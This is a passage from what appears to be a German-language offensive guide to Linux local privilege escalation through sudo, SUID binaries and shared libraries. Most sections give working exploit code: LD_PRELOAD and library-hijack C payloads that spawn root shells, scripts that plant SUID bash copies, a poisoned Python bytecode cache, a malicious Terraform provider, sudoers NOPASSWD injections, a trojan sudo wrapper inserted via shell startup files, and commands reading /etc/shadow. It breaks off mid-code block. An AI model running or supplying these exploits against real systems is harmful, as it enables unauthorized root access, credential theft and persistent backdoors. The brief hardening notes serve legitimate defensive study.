Eine uneingeschränkte sudo-Freigabe mit Root-Rechten für `prusaslicer` oder `prusa-slicer` sollte überprüft werden, wenn der Aufrufer das zu slicende `.3mf`-Projekt auswählen kann. Ein Projekt kann ein Post-Processing-Skript enthalten, das beim Export von G-Code ausgeführt wird; speziell erstellte Projekte konnten bis einschließlich Version 2.6.1 Befehle in PrusaSlicer ausführen ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Prüfe die wirksame sudo-Regel, die Binärversion und Hersteller-Patches, die Herkunft des Projekts sowie, ob der relevante Exportpfad ausgeführt wird, bevor du zu dem Schluss kommst, dass die Privilegiengrenze überwunden werden kann. Ein fest vorgegebenes Projektargument oder eine wirksame `NOEXEC`-Richtlinie kann das Ergebnis ändern. Allein die Installation des Slicers belegt keinen Pfad zur Rechteausweitung.

### SETENV

Diese Direktive ermöglicht es dem Benutzer, **eine Umgebungsvariable zu setzen**, während etwas ausgeführt wird:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war anfällig für **PYTHONPATH hijacking**, wodurch beim Ausführen des Skripts als root eine beliebige Python-Bibliothek geladen werden konnte:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Vergiftung beschreibbarer `__pycache__`- und `.pyc`-Dateien in per sudo erlaubten Python-Imports

Wenn ein **per sudo erlaubtes Python-Script** ein Modul importiert, dessen Paketverzeichnis einen **beschreibbaren `__pycache__`** enthält, kannst du möglicherweise die zwischengespeicherte `.pyc`-Datei ersetzen und beim nächsten Import Code als privilegierter Benutzer ausführen.<sup>[[30]](#references)</sup>

- Warum das funktioniert:
  - CPython speichert Bytecode-Caches unter `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Der Interpreter validiert den **Header** (Magic Number und Zeitstempel-/Hash-Metadaten, die an den Quellcode gebunden sind) und führt dann das darin gespeicherte marshaled Code-Objekt aus.
  - Wenn du die zwischengespeicherte Datei löschen und neu erstellen kannst, weil das Verzeichnis beschreibbar ist, lässt sich auch eine root-eigene, aber nicht beschreibbare `.pyc`-Datei ersetzen.
- Typischer Ablauf:
  - `sudo -l` zeigt ein Python-Script oder einen Wrapper, den du als root ausführen kannst.
  - Das Script importiert ein lokales Modul aus `/opt/app/`, `/usr/local/lib/...` usw.
  - Das `__pycache__`-Verzeichnis des importierten Moduls ist für deinen Benutzer oder alle Benutzer beschreibbar.

Schnelle Enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Wenn du das privilegierte Skript untersuchen kannst, ermittle die importierten Module und deren Cache-Pfad:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Missbrauchsablauf:

1. Führe das sudo-erlaubte Skript einmal aus, damit Python die legitime Cache-Datei erstellt, falls sie noch nicht existiert.
2. Lies die ersten 16 Bytes aus der legitimen `.pyc`-Datei und verwende sie in der vergifteten Datei wieder.
3. Kompiliere ein Payload-Code-Objekt, führe `marshal.dumps(...)` darauf aus, lösche die ursprüngliche Cache-Datei und erstelle sie mit dem ursprünglichen Header plus deinem schädlichen Bytecode neu.
4. Führe das sudo-erlaubte Skript erneut aus, damit der Import dein Payload als root ausführt.

Wichtige Hinweise:

- Der ursprüngliche Header muss wiederverwendet werden, da Python die Cache-Metadaten mit der Quelldatei abgleicht, nicht aber prüft, ob der Bytecode-Inhalt tatsächlich zur Quelle passt.
- Das ist besonders nützlich, wenn die Quelldatei root gehört und nicht beschreibbar ist, das enthaltende `__pycache__`-Verzeichnis aber beschreibbar ist.
- `PYTHONDONTWRITEBYTECODE=1` und `python -B` verhindern, dass Python neue `.pyc`-Dateien schreibt. Sie verhindern **nicht**, dass Python einen bereits gültigen, vom Angreifer ersetzten Cache lädt. Entscheidend ist, ob ein Benutzer mit geringeren Berechtigungen einen Cache ersetzen kann, den der privilegierte Import akzeptiert. Vor dem Laden von gecachtem Bytecode prüft Python die Zeitstempel-/Größen- oder Hash-Metadaten. Siehe die [Python-Importreferenz](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) und die [Dokumentation der Kommandozeile](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Minimale Proof-of-Concept-Struktur:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Härtung:

- Stelle sicher, dass kein Verzeichnis im privilegierten Python-Importpfad für Benutzer mit niedrigen Privilegien beschreibbar ist, einschließlich `__pycache__`.
- Prüfe Eigentümer und Berechtigungen von Cache-Verzeichnissen, einschließlich vorhandener `.pyc`-Dateien. Das Deaktivieren von Bytecode-Schreibvorgängen kann die Erstellung neuer Caches reduzieren, macht aber einen ersetzbaren vorhandenen Cache nicht unschädlich.
- Behandle beschreibbare lokale Python-Module und beschreibbare Cache-Verzeichnisse genauso wie beschreibbare Shell-Skripte oder Shared Libraries, die als Root ausgeführt werden.

### BASH_ENV über sudo env_keep beibehalten → Root-Shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du Bashs Startverhalten für nicht interaktive Shells ausnutzen, um beliebigen Code als Root auszuführen, wenn du einen erlaubten Befehl aufrufst.<sup>[[24]](#references)</sup>

- Warum es funktioniert: Bei nicht interaktiven Shells wertet Bash `$BASH_ENV` aus und lädt die angegebene Datei, bevor das Zielshellskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn sudo `BASH_ENV` beibehält, wird deine Datei mit Root-Rechten geladen.<sup>[[23]](#references)</sup>

- Voraussetzungen:
  - Eine sudo-Regel, die du ausführen kannst (ein beliebiges Ziel, das `/bin/bash` nicht interaktiv aufruft, oder ein beliebiges Bash-Skript).
  - `BASH_ENV` ist in `env_keep` enthalten (prüfe dies mit `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Härtung:
  - Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzuge `env_reset`.
  - Vermeide Shell-Wrapper für sudo-erlaubte Befehle; verwende minimale Binaries.
  - Ziehe sudo-I/O-Logging und Benachrichtigungen in Betracht, wenn erhaltene Umgebungsvariablen verwendet werden.

### Terraform via sudo mit erhaltenem HOME (!env_reset)

Wenn sudo Terraform als privilegierterer Benutzer erlaubt, ist `!env_reset` ein Hinweis darauf, zu prüfen, welche Umgebungsvariablen bei dieser spezifischen Regel tatsächlich erhalten bleiben. Bestätige das effektive `HOME` oder `TF_CLI_CONFIG_FILE`, bevor du eine für den aufrufenden Benutzer beschreibbare `.terraformrc`- oder `terraform.rc`-Datei als aktive CLI-Konfiguration behandelst. Ein Eintrag `provider_installation.dev_overrides` ist nur dann relevant, wenn der festgelegte Terraform-Befehl diesen Provider lädt und der aufrufende Benutzer dessen ausführbare Datei im ausgewählten Verzeichnis ablegen kann.<sup>[[25]](#references)</sup>

- Verweise den erforderlichen Provider auf ein beschreibbares Verzeichnis und lege ein bösartiges Plugin mit dem Namen des Providers ab (z. B. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform wird beim Go-Plugin-Handshake scheitern, führt aber vorher die Payload als root aus und hinterlässt eine SUID-Shell.

### TF_VAR-Overrides + Symlink-Validierungs-Bypass

Terraform-Variablen können über Umgebungsvariablen der Form `TF_VAR_<name>` bereitgestellt werden, wenn die entsprechende sudo-Regel sie beibehält. Für ein **Lesen** über einen Quell-Symlink ist außerdem ein Provider erforderlich, der dem Link folgt und das geschützte Ergebnis an ein für den aufrufenden Benutzer lesbares Ziel kopiert. Für ein **Schreiben** über einen Ziel-Symlink braucht es separat einen vom aufrufenden Benutzer kontrollierten Zieleintrag und einen privilegierten Provider, der dem Link beim Schreiben folgt; ein späterer geplanter Job ist nur eine mögliche Folge. Prüfen Sie den genauen sudo-Zugriff, die relevanten `.tf`-Dateien, die ausgewählte CLI-Konfiguration und die Pfadberechtigungen mit schreibgeschützten Befehlen wie `sudo -l`, `stat` und `readlink`, bevor Sie eine der beiden Methoden testen. Schwache lexikalische Validierungen wie `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` lösen Symlinks nicht auf:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform löst den Symlink auf und kopiert die echte Datei `/root/root.txt` an ein für Angreifer lesbares Ziel. Derselbe Ansatz kann verwendet werden, um in privilegierte Pfade zu **schreiben**, indem vorab Symlinks am Ziel erstellt werden (z. B. mit einem Verweis auf einen Pfad innerhalb von `/etc/cron.d/` als Zielpfad des Providers).

### requiretty / !requiretty

Auf einigen älteren Distributionen kann sudo mit `requiretty` konfiguriert sein, wodurch sudo nur von einem interaktiven TTY aus ausgeführt werden kann. Wenn `!requiretty` gesetzt ist (oder die Option fehlt), kann sudo aus nicht-interaktiven Kontexten wie Reverse Shells, Cron-Jobs oder Skripten ausgeführt werden.

```bash
Defaults !requiretty
```

Dies ist für sich genommen keine direkte Schwachstelle, erweitert aber die Situationen, in denen sudo-Regeln ohne vollständige PTY missbraucht werden können.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Wenn `sudo -l` `env_keep+=PATH` oder einen `secure_path` mit für Angreifer beschreibbaren Einträgen (z. B. `/home/<user>/bin`) anzeigt, kann ein nicht qualifizierter externer Befehl innerhalb des durch sudo erlaubten Ziels überschattet werden.<sup>[[3]](#references)</sup> Auch ein fehlender effektiver `secure_path` sollte geprüft werden, **wenn** die sudo-Umgebung des Befehls einen vom Aufrufer kontrollierten `PATH` beibehält; allein das Fehlen beweist nicht, dass dies der Fall ist. Lies das erlaubte Skript, ohne es auszuführen, und überprüfe anschließend die genaue RunAs- und Argumentregel, den effektiven Befehlssuchpfad sowie ein früheres, beschreibbares und durchsuchbares Verzeichnis, das den Befehlsnamen enthält. Authentifizierung, `NOEXEC`, Shell-Builtins und absolute Befehlspfade können das Ergebnis beeinflussen.

- Voraussetzungen: eine sudo-Regel (oft `NOPASSWD`), die ein Skript/Binary ausführt, das Befehle ohne absolute Pfade aufruft (`free`, `df`, `ps` usw.), sowie ein beschreibbarer `PATH`-Eintrag, der zuerst durchsucht wird.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo-Ausführung unter Umgehung von Pfaden
**Jump**, um andere Dateien zu lesen oder **Symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Wenn ein **wildcard** verwendet wird (\*), ist es sogar noch einfacher:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binärdatei ohne Befehlspfad

Wenn die **sudo-Berechtigung** für einen einzelnen Befehl **ohne Angabe des Pfads** erteilt wird: _hacker10 ALL= (root) less_, kannst du sie ausnutzen, indem du die PATH-Variable änderst

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Diese Technik kann auch verwendet werden, wenn eine **suid**-Binärdatei **einen anderen Befehl ausführt, ohne den Pfad dazu anzugeben (überprüfe den Inhalt einer ungewöhnlichen SUID-Binärdatei immer mit** _**strings**_**)**.

[Payload-Beispiele zur Ausführung.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-Binärdatei mit Befehlspfad

Wenn die **suid**-Binärdatei **einen anderen Befehl mit Angabe des Pfads ausführt**, kannst du versuchen, eine **Funktion zu exportieren**, die nach dem Befehl benannt ist, den die suid-Datei aufruft.

Wenn eine suid-Binärdatei beispielsweise _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Wenn du dann die SUID-Binärdatei aufrufst, wird diese Funktion ausgeführt.

### Benutzerdefinierte SUID-Kopier-Wrapper

Ein root-eigenes SUID-Hilfsprogramm, das Quell- und Zielpfade entgegennimmt, kann zwei unterschiedliche Vertrauensgrenzen überschreiten. Wenn es aus einem der Argumente einen Shell-Befehl zusammensetzt (zum Beispiel, indem es einen konstruierten `cp`-Befehl an `system()` übergibt), können Shell-Metazeichen einen weiteren Befehl mit den effektiven Rechten des Programms ausführen. Selbst wenn es `cp` sicher und ohne Shell aufruft, kann ein uneingeschränktes Ziel beliebige privilegierte Schreibzugriffe auf Dateien wie `/etc/passwd` ermöglichen. Prüfe die Argumentverarbeitung des Wrappers, sein Verhalten bezüglich der effektiven UID, Einschränkungen für das Ziel und ob die kopierte Datei vom Aufrufer kontrollierte Inhalte behält; ein allgemeiner `cp`-Fehler oder ein SUID-Bit allein beweist keinen dieser möglichen Pfade. Ermittle die Binärdatei und ihre Berechtigungen passiv, bevor du manuelle Tests durchführst.

### Schreibbares Skript, das von einem SUID-Wrapper ausgeführt wird

Eine häufige Fehlkonfiguration in benutzerdefinierten Anwendungen ist ein root-eigener SUID-Binär-Wrapper, der ein Skript ausführt, während das Skript selbst für Nutzer mit geringen Rechten beschreibbar ist.

Typisches Muster:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Wenn `/usr/local/bin/backup.sh` beschreibbar ist, kannst du Payload-Befehle anhängen und anschließend den SUID-Wrapper ausführen:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Schnellprüfungen:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Dieser Angriffsweg ist besonders häufig bei „maintenance“-/„backup“-Wrappern, die unter `/usr/local/bin` ausgeliefert werden.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere Shared Libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang wird als Preloading einer Library bezeichnet.

Um jedoch die Systemsicherheit zu gewährleisten und einen Missbrauch dieser Funktion zu verhindern, insbesondere bei **suid/sgid**-Executables, setzt das System bestimmte Bedingungen durch:

- Der Loader ignoriert **LD_PRELOAD** bei Executables, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Libraries aus Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Eine Rechteausweitung kann erfolgen, wenn du Befehle mit `sudo` ausführen kannst und die Ausgabe von `sudo -l` die Angabe **env_keep+=LD_PRELOAD** enthält. Durch diese Konfiguration bleibt die Umgebungsvariable **LD_PRELOAD** erhalten und wird auch dann berücksichtigt, wenn Befehle mit `sudo` ausgeführt werden. Dadurch kann beliebiger Code mit erhöhten Rechten ausgeführt werden.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Speichern unter **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Dann **kompiliere es** mit:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Schließlich **weiten Sie Ihre Berechtigungen aus**, indem Sie

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Ein ähnlicher privesc kann missbraucht werden, wenn der Angreifer die Umgebungsvariable **LD_LIBRARY_PATH** kontrolliert, da er den Pfad kontrolliert, in dem nach Bibliotheken gesucht wird.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID-Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Berechtigungen stößt, das ungewöhnlich erscheint, sollte man überprüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich mit folgendem Befehl prüfen:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Beispielsweise deutet ein Fehler wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf eine mögliche Ausnutzung hin.

Dazu würde man eine C-Datei, etwa _"/path/to/.config/libcalc.c"_, mit folgendem Code erstellen:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Dieser Code soll nach dem Kompilieren und Ausführen durch Manipulation von Dateiberechtigungen und Starten einer Shell mit erhöhten Rechten Privilegien eskalieren.

Kompiliere die obige C-Datei mit folgendem Befehl zu einer Shared-Object-Datei (.so):

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Schließlich sollte das Ausführen der betroffenen SUID-Binärdatei den Exploit auslösen und eine potenzielle Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Nachdem wir nun eine SUID-Binärdatei gefunden haben, die eine Bibliothek aus einem Ordner lädt, in den wir schreiben können, erstellen wir die Bibliothek mit dem erforderlichen Namen in diesem Ordner:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Wenn du einen Fehler wie den folgenden erhältst_final

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

das bedeutet, dass die von dir generierte Bibliothek eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binärdateien, die ein Angreifer ausnutzen kann, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe für Fälle, in denen du **nur Argumente in einen Befehl einschleusen** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binärdateien, die missbraucht werden können, um aus eingeschränkten shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, Bind- und Reverse-Shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Sudo-Tokens wiederverwenden

Wenn du **sudo-Zugriff** hast, aber nicht das Passwort kennst, kannst du Privilegien eskalieren, indem du auf die Ausführung eines sudo-Befehls wartest und dann das Sitzungstoken übernimmst.<sup>[[18]](#references)</sup>

Voraussetzungen für die Privilegieneskalation:

- Du hast bereits eine shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten `sudo` verwendet** (standardmäßig gilt ein sudo-Token so lange, sodass wir `sudo` ohne Passworteingabe verwenden können)
- `cat /proc/sys/kernel/yama/ptrace_scope` gibt 0 zurück
- `gdb` ist verfügbar (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft ändern, indem du `/etc/sysctl.d/10-ptrace.conf` bearbeitest und `kernel.yama.ptrace_scope = 0` setzt.)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt die Binärdatei `activate_sudo_token` in _/tmp_. Du kannst sie verwenden, um **das sudo-Token in deiner Sitzung zu aktivieren** (du erhältst nicht automatisch eine root-shell, führe `sudo su` aus):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, **die root gehört und setuid gesetzt hat**.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Der **dritte Exploit** (`exploit_v3.sh`) **erstellt eine sudoers-Datei**, durch die **sudo-Tokens dauerhaft gültig bleiben und alle Benutzer sudo verwenden können**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Wenn du **Schreibberechtigungen** für den Ordner oder eine der darin erstellten Dateien hast, kannst du die Binärdatei [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und eine PID zu erstellen**.\
Wenn du beispielsweise die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit der PID 1234 hast, kannst du **sudo-Berechtigungen erhalten**, ohne das Passwort kennen zu müssen:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` verwenden darf und wie. Diese Dateien können **standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, kannst du möglicherweise **interessante Informationen erhalten**. Wenn du eine beliebige Datei **schreiben** kannst, kannst du **deine Berechtigungen erweitern**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Eine weitere Möglichkeit, diese Berechtigungen auszunutzen:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Es gibt einige Alternativen zum Binary `sudo`, etwa `doas` für OpenBSD. Denken Sie daran, die Konfiguration unter `/etc/doas.conf` zu überprüfen.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Wenn `doas` einen Editor oder Interpreter zulässt, prüfe GTFOBins-ähnliche Ausbruchsmöglichkeiten:

```bash
doas vim
:!/bin/sh
```

Eine `doas`-Regel mit Root-Berechtigungen für das ursprüngliche Python-basierte `dstat` sollte auch auf den Plugin-Pfad hin überprüft werden. Das [Handbuch](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) und der [Quellcode](https://github.com/dstat-real/dstat/blob/master/dstat) führen `/usr/share/dstat/` und `/usr/local/share/dstat/` als Speicherorte für `dstat_*.py`-Plugins auf. Wenn der aktuelle Benutzer an einen Speicherort schreiben und darin suchen kann, der vom installierten Build tatsächlich verwendet wird, kann ein ausgewähltes Plugin mit der `doas`-RunAs-Identität ausgeführt werden. Prüfe die effektive Regel, die Plugin-Suche in diesem Build, die Berechtigungen oder ACLs des Verzeichnisses und seiner übergeordneten Verzeichnisse sowie, ob der Aufrufer ein Plugin auswählen kann; eine `dstat`-Regel oder ein beschreibbares Verzeichnis allein ist nur ein Hinweis. Andere `dstat`-Implementierungen können unterschiedliche Plugin-Systeme verwenden. Prüfe Metadaten passiv, ohne ein Plugin zu laden.

### Sudo Hijacking

Wenn du weißt, dass sich ein **Benutzer normalerweise mit einem Rechner verbindet und `sudo` verwendet**, um seine Berechtigungen zu erweitern, und du eine Shell im Kontext dieses Benutzers erhalten hast, kannst du **eine neue sudo-Executable erstellen**, die deinen Code als Root und anschließend den Befehl des Benutzers ausführt. Ändere dann den **$PATH** des Benutzerkontexts (indem du beispielsweise den neuen Pfad zu .bash_profile hinzufügst), damit beim Aufruf von sudo durch den Benutzer deine sudo-Executable ausgeführt wird.

Wenn der Benutzer eine andere Shell als Bash verwendet, musst du andere Dateien ändern, um den neuen Pfad hinzuzufügen. Beispielsweise ändert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc` und `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py).

Oder führe etwas wie Folgendes aus:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Shared Library

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` eingelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** **gesucht** wird. Zum Beispiel lautet der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System in `/usr/local/lib` nach Bibliotheken sucht**.

Wenn **ein Benutzer aus irgendeinem Grund Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, einer Datei in `/etc/ld.so.conf.d/` oder einem Ordner, der in einer Konfigurationsdatei in `/etc/ld.so.conf.d/*.conf` angegeben ist, kann er möglicherweise seine Berechtigungen erweitern.\
Sieh dir auf der folgenden Seite an, **wie sich diese Fehlkonfiguration ausnutzen lässt**:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Durch das Kopieren der lib nach `/var/tmp/flag15/` wird sie vom Programm an diesem Ort verwendet, wie in der Variable `RPATH` angegeben.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Erstellen Sie dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

